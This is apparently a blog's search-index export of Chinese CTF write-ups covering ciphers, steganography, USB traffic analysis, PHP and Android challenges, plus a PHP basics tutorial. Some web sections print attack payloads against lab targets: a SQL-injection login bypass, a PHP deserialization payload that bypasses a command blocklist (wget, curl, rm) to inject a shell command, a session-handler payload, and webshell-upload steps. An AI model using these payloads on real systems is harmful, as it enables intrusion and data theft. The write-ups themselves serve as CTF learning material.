<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[i春秋-CTF训练大本营题解]]></title>
    <url>%2F2018%2F03%2F08%2Fi%E6%98%A5%E7%A7%8B-CTF%E8%AE%AD%E7%BB%83%E5%A4%A7%E6%9C%AC%E8%90%A5%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Misc你好，i春秋按照提示关注微信号icqedu，然后回复1CTF-&gt;关注了-&gt;星期几-&gt;是-&gt;....-&gt;是-&gt;不愿意-&gt;get flag Hello World看题目，flag，就在题目提示里面。 Vape Nation得到一张图片，用StegSolve分析一下，flag在Green plane 0。 百度杯签到题又是调戏微信机器人啊啊啊啊啊啊啊啊啊，好像暴打出题人+11234提示：对百度杯用时下最流行的表白（去调戏i春秋公众号）大声说出你的爱！！！么么哒百度杯么么哒 那些年我追过的贝丝根据题目提示是base64加密解密脚本：123456# ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=import base64decode = &quot;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&quot;decode = base64.b64decode(b&apos;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&apos;)print decode 我要变成一只程序猿将题目给的字符串放到程序里面运行一下皆可以了。代码如下： 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main() &#123;char str[100]=&quot;&quot;;int i;int len;printf(&quot;input string:\n&quot;);gets(str);len=strlen(str);printf(&quot;result:\n&quot;);for(i=0;i&lt;len+1;i++)&#123; putchar(str[len-i]);&#125;printf(&quot;\n&quot;);&#125;//ba1f2511fc30423bdb 剧情大反转直接将这串字符串翻转就得到flag了1&#125;~144_0t_em0c14w&#123;galf challenge题目内容：666c61677b686578327374725f6368616c6c656e67657d1、MD5 解不出来2、十六进制转换 getflag解密地址 try again给了一个文件，放到winhex里面，直接ctrl+f 搜索flag可以得到flag 表姐家的签到题题目内容：出题人表示金盆洗手不坑任何参赛选手干脆利落，直接奉上答案就是123456abcdef所以手动加上flag{}就过了 泄露的数据125d55ad283aa400af464c76d713c07ad 直接MD5一下就可以了解密地址 考眼力12题目内容： gmbh&#123;4d850d5c3c2756f67b91cbe8f046eebd&#125; 直接凯撒一下就能得到flag flag格式题目内容：你真的知道flag格式吗？尝试提交flag{0ahief9124jfjir}直接提交就过了！！！ 所以这是13点吗12题目内容：synt&#123;mur_VF_syn9_svtug1at&#125; 直接凯撒解密皆可以得到flag 加群签到题123456题目内容：加群得flag：496265176一群已满，请做这题的大佬们加入二群：455849389flag也转移到二群啦~key：ichunqiumemeda 在群文件找到压缩包，解压得到flag。 小可爱得到一张图片1、binwalk分离出压缩包；2、暴力破解压缩包密码；3、得到一张撕碎的二维码4、还原一下二维码即可得到flag（很想打出题人有没有） 贝斯家族题目意思应该是base64加密，进一步判断发现是base32加密解密如下：12345&gt;&gt;&gt;import base64&gt;&gt;&gt; decode = base64.b32decode(b&apos;MZWGCZ33MVZGQZLJL5STQOJTGRPWK4SVJ56Q====&apos;)&gt;&gt;&gt; decodeb&apos;flag&#123;erhei_e8934_erUO&#125;&apos;&gt;&gt;&gt; 山岚12题目内容：f5-lf5aa9gc9&#123;-8648cbfb4f979c-c2a851d6e5-c&#125; 容易想到是栅栏密码，解密一下得到flag。 签到题2unicode编码，不过使用在线转换一直转换不了，就直接替换成十六进制，然后在解密。 123\u0066\u006c\u0061\u0067\u007b\u0074\u0068\u0031\u0073\u005f\u0069\u0073\u005f\u0055\u006e\u0031\u0063\u0030\u0064\u0065\u005f\u0079\u006f\u0075\u005f\u004b\u006e\u006f\u0077\u003f\u007d 66 6c 61 67 7b 74 68 31 73 5f 69 73 5f 55 6e 31 63 30 64 65 5f 79 6f 75 5f 4b 6e 6f 77 3f 7d 滴滴滴一看就知道是摩斯电码,解密后发现格式不对，就照着修改修改，得到flag。12345678..-. .-.. .- --. . --... .---- -.-. .- ..... -.-. -.. -....- --... -.. -... ----. -....- ....- -... .- ...-- -....- ----. ...-- ---.. ...-- -....- .---- .- ..-. ---.. -.... --... ---.. ---.. .---- ..-. ----- --...FLAG E71CA5CD null 7DB9 null 4BA3 null 9383 null 1AF867881F07FLAG&#123;E71CA5CD-7DB9-4BA3-9383-1AF867881F07&#125;flag&#123;e71ca5cd-7db9-4ba3-9383-1af867881f07&#125; XX题目提示XX，想到是XXencode解密地址12题目内容：LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+ 敲击1、敲击密码 不是QAQ2、键盘密码 getflag1234题目内容：方方格格，不断敲击“wdvtdz qsxdr werdzxc esxcfr uygbn”flag格式为：flag&#123;小写的字符串&#125; 签到题3MD5解密一下得到flag解密地址1234题目内容：21232f297a57a5a743894a0e4a801fc3flag&#123;admin&#125; 小常识这个知识点不是很了解QWQ1234567891011题目内容：低频ID卡数据格式转换小常识将下列16进制串中倒数第5，6位转换为3位十进制数，将最后4位转换为5位十进制卡号，中间用“，”分开。0 0 0 0 94 466494 = 1484664 = 18020（用计算机进制转换得出）flag&#123;148,18020&#125; 回归原始应该是二进制转化123456题目内容：让我们回到最开始的地方011001100110110001100001011001110111101101100011011001010011001101100101001101010011000000110010011000110010110100110100001110000110001100111001001011010011010001100100001101010011000000101101001110010011100100111001001100000010110100110101011000100011100000110001011001000110001000110110011001100110001101100010011001100011000001111101f l a g &#123; c e 3 e 5 0 2 c - 4 8 c 9 - 4 d 5 0 - 9 9 9 0 - 5 b 8 1 d b 6 f c b f 0 &#125;flag&#123;ce3e502c-48c9-4d50-9990-5b81db6fcbf0&#125; 一个十六岁的少年很容易想到base16加密。12345678题目内容：有一天，表姐的好朋友贝丝远房的表亲，一个16岁的少年给表姐递了一封情书，表姐看不懂，你能帮忙翻译下吗？666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D&gt;&gt;&gt; decode = base64.b16decode(b&apos;666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D&apos;)&gt;&gt;&gt; decodeb&apos;flag&#123;ec8b2ee0-3ae9-4c21-a012-08aa5fa7be67&#125;&apos; +——+Brainfuck编码12345678910题目内容：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- --.+. ----- -.&lt;+++++++ [-&gt;++ +++++ &lt;]&gt;++ ++.-- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- .------.++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; --.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;+++++ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ---.+ +++++ +.+++ ++.-- ----- .&lt;+++++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- .&lt;+++ ++++[-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;.++ ++.-- -.--- -.&lt;++ +++++[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- ---.- --.&lt;+ ++++++[-&gt;+ +++++ +&lt;]&gt;+ ..&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.-- -.+.+ ++.-- ---.+++++. ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt; 解密地址 福尔摩斯1234题目内容：贝克街旁的圆形广场·-· ·-· ·-· ·-· ·-· ·-· ·flag格式：flag&#123;*********&#125; 摩斯电码，和对照表对比一下得到flag misc1-纵横四海题目提示分久必合合久必分，所以把压缩包里面每个文件的内容拼接起来就是flag这种排序第一次看到，当然也可以用python来解决。12345//windows下命令行**&gt; cd tiaoxiwoya**&gt; type dabiaojie* &gt;&gt;flag.txtflag&#123;0a47061d-0619-4932-abcd-5426f4ea34aa&#125;fjicjeowqkfoqwjfoqf 常在邮件头里的秘密12题目内容：flag&#123;ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6&#125; 没接触过这个编码，所以参考了一下wp1234曾接触过类似特征的编码，判断为可打印字符编码(Quoted_Printable),在线解码即得到flag在所有邮件处理的各式各样的编码中，很多编码的目的都是通过编码手段使 得七位字符的邮件协议体系可以传送八位的二进制文件、双字节语言文字等等。 Quoted-Printable也是这样一些编码中的一个， 它的目的同样是帮助非ASCII 编码的信件传输通过 SMTP。Quoted-Printable 编码是字符对应的编码，每个未 编码的二进制字符被编码成三个字符，即一个等号和一个十六进制的数字，如“=A8”。 Quoted-Printable编码的源码样式如下: =D4=DA=CB=F9=D3=D0=D3=CA=BC=FE=B4=A6=C0=ED…… 解密地址 吃货一看到题目就想到培根密码1234567891011121314151617题目内容：麻辣烫的标配flag&#123;abbab_babbb_baaaa_aaabb&#125;培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：第一种方式：A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaabK ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabbU babaa V babab W babba X babbb Y bbaaa Z bbaab第二种方式a AAAAA g AABBA n ABBAA t BAABAb AAAAB h AABBB o ABBAB u-v BAABBc AAABA i-j ABAAA p ABBBA w BABAAd AAABB k ABAAB q ABBBB x BABABe AABAA l ABABA r BAAAA y BABBAf AABAB m ABABB s BAAAB z BABBB misc11、binwalk 没东西2、图像分析 没结果3、winhex flag在底部 misc2给了一张图片以为是隐写，浪费了好多时间没做出来，后面看了官方的WP才知道是猪圈密码1flag&#123;NSN&#125; misc3百度一下键盘坐标密码1234567891011121314151617181920212223242526题目内容：哒哒哒哒，你知道什么是键盘坐标密码吗？11 21 31 18 27 33 34flag格式：flag&#123;*****&#125;什么是键盘坐标密码：我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密[注2]：1 2 3 4 5 6 7 8 9 0Q W E R T Y U I O PA S D F G H J K LZ X C V B N M我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：A 12 B 53 C 33第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置就可以得到最后的答案：flag&#123;QAZIJ**&#125;QAZIJCVflag&#123;*********&#125; 听说是rc4算法123题目内容：key welcometoicqedu 密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw== 这里参考了这篇文章python脚本如下：1234567891011121314151617181920212223242526272829import random, base64 from hashlib import sha1 def crypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return ‘‘.join(out) def tdecode(data, key, decode=base64.b64decode, salt_length=16): if decode: data = decode(data) salt = data[:salt_length] return crypt(data[salt_length:], sha1(key + salt).digest()) if __name__==‘__main__‘: data = ‘UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==‘ key = ‘welcometoicqedu‘ decoded_data = tdecode(data=data, key=key) print decoded_data 传说中的签到题纯脑洞题，被秀的不要不要的啊啊啊啊啊啊阿好像打出题人QAQ123456题目内容：小编保证这次是正常的签到题。按例，继续调戏小i公众号输入关键词“答案在哪里”就能获得你想要的。诺！扫码直接关注 1、去公众号回复发现没有什么突破口2、扫描二维码 发现一些文字“就算你发现我但是知道flag是什么??”所以flag就是 什么]]></content>
  </entry>
  <entry>
    <title><![CDATA[安恒杯2月月赛复现记录]]></title>
    <url>%2F2018%2F03%2F07%2F%E5%AE%89%E6%81%92%E6%9D%AF2%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[手快抢了一个复现账号，就去看看这些个难题嘤嘤嘤！ Cipher题目描述12345题目名称Cipher题目说明还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 公平的玩———&gt;playfair密码（以前没有遇到过QAQ） playfair密码是需要秘钥的;传送门 编制密码表–还原明文–得到flag 凯撒？替换？呵呵！题目描述12345题目名称凯撒？替换？呵呵！题目说明MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; 思路1： 凯撒（行不通） 思路2： 替换密码，按照英文字母的概率规律来解题 隐含条件为–MTHJ对应flag 解密传送门 有思路2可以得到flag123FLAG&#123; SUBSTITUTION CIPHER DECRYPTION IS ALWAYS EASY JUST LIKE A PIECE OF CAKE&#125;#替换成小写提交正确 USB题目描述12345题目名称USB题目说明Do your konw usb?? 考点： usb协议的分析 压缩包的修复 对键盘记录的分析 维吉尼亚密码 栅栏密码 脚本编写能力 题目文件：ftm文件 winhex、binwalk分离，可知道是一个usb流量文件 考虑使用python的scapy模块编写脚本自动提取,提取的到key{XINAN} 脚本如下(貌似有点小问题)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python#show_keyboard.pyfrom scapy.all import * VISIBLE_KEY_CODES=&#123; 4:&quot;A&quot;, 5:&quot;B&quot;, 6:&quot;C&quot;, 7:&quot;D&quot;, 8:&quot;E&quot;, 9:&quot;F&quot;, 10:&quot;G&quot;, 11:&quot;H&quot;, 12:&quot;I&quot;, 13:&quot;J&quot;, 14:&quot;K&quot;, 15:&quot;L&quot;, 16:&quot;M&quot;, 17:&quot;N&quot;, 18:&quot;O&quot;, 19:&quot;P&quot;, 20:&quot;Q&quot;, 21:&quot;R&quot;, 22:&quot;S&quot;, 23:&quot;T&quot;, 24:&quot;U&quot;, 25:&quot;V&quot;, 26:&quot;W&quot;, 27:&quot;X&quot;, 28:&quot;Y&quot;, 29:&quot;Z&quot;, 30:&quot;1&quot;, 31:&quot;2&quot;, 32:&quot;3&quot;, 33:&quot;4&quot;, 34:&quot;5&quot;, 35:&quot;6&quot;, 36:&quot;7&quot;, 37:&quot;8&quot;, 38:&quot;9&quot;, 39:&quot;0&quot;, 40:&quot;\n&quot;, 44:&quot;&quot;, 45:&quot;&quot;, 46:&quot;=&quot;, 47:&quot;&#123;&quot;, 48:&quot;&#125;&quot;, 49:&quot;\\&quot;, 51:&quot;;&quot;, 52:&quot;&apos;&quot;, 53:&quot;~&quot;, 54:&quot;,&quot;, 55:&quot;.&quot;, 56:&quot;/&quot;,&#125;pkts = rdpcap(&quot;key.pcap&quot;)msg = &quot;&quot;for packet in pkts: keybord_data = packet.load[-8:] key_code = ord(keybord_data[2]) ch = VISIBLE_KEY_CODES.get(key_code,False) if ch: msg += chprint msg rar压缩包 1、直接解压提示233.png头部损坏（进行修复） 2、图片在分析工具下可以得到一张二维码 （扫码得到ci{v3erf_0tygidv2_fc0}，这个跟前面的KEY{XINAN}，应该是一种密码，这里考查的是维吉尼亚密码。） 揭秘传送门 3、上一步得到fa{i3eei_0llgvgn2_sc0 栅栏解密可得flag 溯源题目描述12345题目名称溯源题目说明http://ip/secret 出题思路:这道题目是一次简单的溯源流程，首先拿到一个secret文件，通过分析找到后门中隐藏的url，因为题目要提前出好，不能预先知道ip，所以把文件和web服务放到了一块，找url的过程简化为只需要找到后缀。 考点: 磁盘挂载 extendelete的使用 对chm后门的分析 php反序列化 1、文件为linux下磁盘挂载文件1mount secret /home/tmp 2、挂载一下，cd进去cat一下，发现了后门已经被删除字样，估计需要做一下磁盘恢复。12#卸载磁盘后执行下面的命令可得到一个hack.chm文件extundelete secret --inode 2 3、后门分析（windows环境）12#在同一目录下新建一个hack文件夹hh -decompile hack hack.chm 4、分离出来的，在exp.htm文件中http://xxx.xxx.xxx.xxx/C_0uT.php，猜测需要访问这个页面。5、扫描端口发现8080端口开放着web服务，简单代码审计，反序列化加文件上传6、使用80端口（因为限制了只能本地访问）的web服务上传一句话木马，然后getshell7、远程执行命可以获取flag]]></content>
      <tags>
        <tag>-CTF -WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame(week-2)-未完待续]]></title>
    <url>%2F2018%2F02%2F18%2Fhgame-week-2-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[WEB篇最简单的SQL题是一个登录页面，试了一下万能密码登录，发现登陆成功，得到flag。1234payload:username=admin&apos; or &apos;a&apos;=&apos;a password:随便输入flag:hgame&#123;@s0ng_fen_ti@&#125; REPWNMISCCRYPTO]]></content>
      <tags>
        <tag>-wp -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP入门到放弃-1]]></title>
    <url>%2F2018%2F02%2F18%2FPHP%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83-1%2F</url>
    <content type="text"><![CDATA[PHP在CTF的WEB题经常有应用，这里简要记录一下自己在学习PHP的所见所闻，供自己复习使用，不定期更新…… 变量类型变量类型整型、浮点型、布尔型、数组、对象、NULL、资源（变量就像一个盒子，盒子里面装的是变量的值，不同的盒子就是变量类型） 12345678910111213141516171819202122231)整型[integer] 数学中的整数2)浮点型[float、double] 数学中的小数3)字符串[string] 一串字符4)布尔[boolean] 真假5)数组[array] 键值对复合数据6)对象[object] 暂时不考虑QAQ7)NULL 没有值8)资源[resource] 资源是一种特殊的变量类型，保存了到外部资源的一个引用：如打开文件、数据库连接、图形画布区域等 如何区分变量类型变量值并不是只存储变量值，还存储了它的类型1234567$a = 3;//整型$b = 3.14;//浮点型$c = null;//null型$d = &apos;helloworld&apos;;//字符串型$e = true;//布尔型echo $D;//Notice: Undefined variable 变量名称的命名规范[a-z]-[A-Z]-[0-9]以及下划线1234567891)区分大小写2)不能以数字开头//正确命名$a$_$c3//错误命名$_%$3c 变量检测ehco一个不存在的变量，会报notice级别的错误，所以有必要检测一下这个变量是否存在；isset–检测变量是否设置已声明的变量会返回true未声明的变量会返回false 123456789101112131415161718192021222324252627282930&lt;?php$b = null;$c = false;$d = 0;$e = &apos; &apos;;if(isset($a))&#123; echo &quot;变量a存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量a不存在&lt;br/&gt;&quot;;&#125;if(isset($b))&#123; echo &quot;变量b存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量b不存在&lt;br/&gt;&quot;;&#125;if(isset($c))&#123; echo &quot;变量c存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量c不存在&lt;br/&gt;&quot;;&#125;?&gt;变量a不存在变量b不存在变量c存在 对于值为NULL的变量，也返回false，因为null没有值。未曾声明的变量当然也是不存在的。 类型检测 检测一个变量php将它存储成什么类型–gettype（获取变量的类型） [现成的系统函数] 12345678910111213141516171819202122&lt;?php$b = null;echo gettype($b);echo &quot;&lt;br&gt;&quot;;$c = false;echo gettype($c);echo &quot;&lt;br&gt;&quot;;$d = 0;echo gettype($d);echo &quot;&lt;br&gt;&quot;;$e = &apos; &apos;;echo gettype($e);echo &quot;&lt;br&gt;&quot;;?&gt;NULLbooleanintegerstring 判断变量是否是某种类型 123456789101112131415161718is_float() &amp; is_double()is_int() &amp; is_integer()is_string()is_object()is_array()is_resource()is_bool()is_null()//eg:$b = null;if (is_null($b)) &#123; echo &quot;b为null&lt;br&gt;&quot;;&#125;else&#123; echo &quot;b不为null&quot;;&#125; 调试打印变量 echo 字符串，数字 print_r 打印层次化的数据，比如：数组、对象 var_dump 打印变量的类型及其值123456789101112131415161718192021222324252627282930313233343536&lt;?php$a = &apos;hello&apos;;$b = array(1,2,&quot;3&quot;);$c = false;$d = null;$e = 18;$f = true;echo $a,&apos;&lt;br&gt;&apos;,$b,&apos;&lt;br&gt;&apos;,$c,&apos;&lt;br&gt;&apos;,$d,&apos;&lt;br&gt;&apos;,$e,&apos;&lt;br&gt;&apos;,$f,&apos;&lt;br&gt;&apos;,&apos;&lt;hr&gt;&apos;;print_r($b);echo &apos;&lt;br&gt;&apos;;print_r($c);echo &apos;&lt;br&gt;&apos;;print_r($d);echo &apos;&lt;br&gt;&apos;;print_r($f);echo &apos;&lt;br&gt;&apos;;echo &apos;&lt;hr&gt;&apos;;var_dump($c);echo &apos;&lt;br&gt;&apos;;var_dump($d);echo &apos;&lt;br&gt;&apos;;?&gt;-----------------------------------//布尔的true会打印1，false和null什么都不显示helloArray181------------------------------------Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 ) 1------------------------------------//布尔型数据不要用echo和print_r打印，容易干扰我们，用var_dump打印布尔和nullbool(false) NULL 类型转换赋值销毁动态变量名]]></content>
      <tags>
        <tag>-PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[happy-moctf-新春欢乐赛]]></title>
    <url>%2F2018%2F02%2F13%2Fhappy-moctf-%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[辞旧迎新，离新年没剩几天了，这次是我们自己学校的新春欢乐赛（happymoctf），又来划了一波水。 不得不佩服学弟们做的首页，秀的我这个老年人头皮发麻 WEB篇是时候让你的手指锻炼一下了访问题目地址，查看源代码，可以找到这段代码123456789101112131415161718192021&lt;script&gt; var clicks=0 $(function() &#123; $(&quot;#cookie&quot;) .mousedown(function() &#123; $(this).width(&apos;350px&apos;).height(&apos;350px&apos;); &#125;) .mouseup(function() &#123; $(this).width(&apos;375px&apos;).height(&apos;375px&apos;); clicks++; $(&quot;#clickcount&quot;).text(clicks); if(clicks &gt;= 108000)&#123; var form = $(&apos;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&apos; + &apos;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&apos; + clicks + &apos;&quot; hidden/&gt;&apos; + &apos;&lt;/form&gt;&apos;); $(&apos;body&apos;).append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt; 我们可以把clicks的次数直接改成108000，从控制台写入，用burp抓包可以得到flag。1flag:moctf&#123;Here_Is_Your_Surprise&#125; PUBG看了一下源代码发现没有什么，可能存在源码泄露，试了一下发现是bak源码泄露index.php.bak的主要内容12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); include &apos;class.php&apos;; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET[&quot;LandIn&quot;])) &#123; $pos=$_GET[&quot;LandIn&quot;]; &#125; if($pos===&quot;airport&quot;) &#123; die(&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;); &#125; elseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos===&quot;AFK&quot;) &#123; die(&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;); &#125; else &#123; die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;); &#125; &#125;?&gt; 同样我们也得到class.php.bak1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php include &apos;waf.php&apos;; class sheldon&#123; public $bag=&quot;nothing&quot;; public $weapon=&quot;M24&quot;; // public function __toString()&#123; // $this-&gt;str=&quot;You got the airdrop&quot;; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag=&quot;nothing&quot;; $this-&gt;weapon=&quot;kar98K&quot;; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125; else &#123; system(&quot;php .//class//win.php&quot;); &#125; die(); &#125; public function nothing() &#123; die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125; &#125; &#125;?&gt; 参考了这几篇文章：http://blog.csdn.net/qq_27446553/article/details/53378847http://blog.csdn.net/qq_31481187/article/details/60968595http://blog.csdn.net/qq_31481187/article/details/53189113http://www.jb51.net/article/107101.htm 理解序列化的字符串（unserlialize的参数）：1234567891011O:3:”foo”:2:&#123;s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;&#125;O:3: 参数类型为对象(object),数组(array)为a“foo”:2: 参数名为foo，有两个值S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.phps:4:”data”;s:5:”aaaaa”;&#125; 长度为4的字符串data，长度为5的字符串aaaaaobject foo，属性file：shell.php，属性data：aaaaa 绕过__wakeup方法12成员属性数目大于实际数目时可绕过wakeup方法，把 O:6:”HITCON”:3 中的3改为任意比3大数字即可；另一种绕过方法为对wakeup过滤的绕过，利用了sql注入中的/**/ 读一下waf.php得到12345678910function waf($values)&#123; //$black = []; $black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;); foreach ($black as $key =&gt; $value) &#123; if(stripos($values,$value))&#123; die(&quot;Attack!&quot;); &#125; &#125;&#125; 我们构造123456789&lt;?phpinclude &apos;class.php&apos;;$a = new sheldon()$a-&gt;weapon = &apos;AWM&apos;;$a-&gt;bag = &apos;flag.php./&apos;;var_dump(serialize($a));?&gt; payload为：1http://120.78.57.208:6001/?LandIn=school&amp;pubg=O:7:%22sheldon%22:20:&#123;s:3:%22bag%22;s:23:%22flag.php;cat%20class/flag%22;s:6:%22weapon%22;s:3:%22AWM%22;&#125; 在源码里可得flag：1flag:moctf&#123;Try_Learn_PhP_h4rder&#125; 登录一哈刚开始不会，后面放hint提示“开发人员用git管理过代码”，我们想到.git文件泄露，用GitHack把源码还原，得到两个php文件:index.php主要代码12345678910111213&lt;?php ini_set(&apos;session.serialize_handler&apos;, &apos;php_binary&apos;); session_start(); if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $_SESSION[&quot;username&quot;] = $username; header(&quot;Location:./index.php&quot;); &#125; else if(isset($_SESSION[&quot;username&quot;]))&#123; echo &apos;&lt;h1&gt;hello &apos;.$_SESSION[&quot;username&quot;].&apos;&lt;/h1&gt;&apos;; &#125; flag.php主要代码123456789101112&lt;?phpsession_start();class MOCTF&#123; public $flag; public $name; function __destruct()&#123; $this-&gt;flag = &quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;; if($this-&gt;flag == $this-&gt;name)&#123; echo &quot;Wow,this is flag:&quot;.$this-&gt;flag; &#125; &#125;&#125; 这里也是一个序列化的问题，这里参考了http://blog.csdn.net/qq_31481187/article/details/60968595http://blog.csdn.net/qq_31481187/article/details/53189113http://www.jb51.net/article/107101.htm 所以我们构造的payload为1|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;i:0;&#125; 登陆后为 然后访问flag.php，得到flag。1Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125; RE篇easyre用IDA打开qiandao这个文件，在hex-view看到猜想可能是12345moctf&#123;Sign-in.desk.english?&#125;moctf&#123;Sign-in-desk-english?&#125;moctf&#123;Sign-indesk-english?&#125; 都试了一下得到flag。1flag:moctf&#123;Sign-indesk-english?&#125; 我的VIP呢，那么大个的VIP是一道安卓逆向，下载apk，用apktoolbox进行jadx，拿到源码，分析了一下主要的几个函数，发现有一个VipFunction的函数123456public class VipFunction extends Activity &#123; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.vipfunction); &#125;&#125; 我们找到R.layout.vipfunction所在的位置1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;moctf&#123;20180202mqlsys&#125;&quot; android:layout_centerInParent=&quot;true&quot; /&gt;&lt;/RelativeLayout&gt; 